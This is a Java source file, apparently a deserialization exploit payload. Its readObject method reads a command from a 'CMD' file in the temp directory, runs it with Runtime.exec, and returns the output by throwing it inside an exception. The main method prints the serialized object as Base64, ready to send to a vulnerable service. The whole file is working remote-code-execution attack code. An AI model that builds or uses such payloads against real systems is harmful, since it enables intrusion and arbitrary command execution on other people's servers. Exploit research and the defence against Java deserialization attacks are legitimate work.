import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * @author threedr3am
 */
public class Threedr3am_12 implements Serializable {
  private static final long serialVersionUID = 1L;

  private void  readObject(ObjectInputStream is) throws Throwable {
    StringBuilder stringBuilder = new StringBuilder();
    try {
      String tmp = System.getProperty("java.io.tmpdir");
      String cmd = new String(Files.readAllBytes(Paths.get(tmp + File.separator + "CMD")));
      InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
      String line;
      while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
      }
    } catch (Throwable e) {
      e.printStackTrace();
    }
    throw new Throwable(stringBuilder.toString());
  }

  public static void main(String[] args) throws IOException {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    new ObjectOutputStream(byteArrayOutputStream).writeObject(new Threedr3am_12());
    System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
  }

}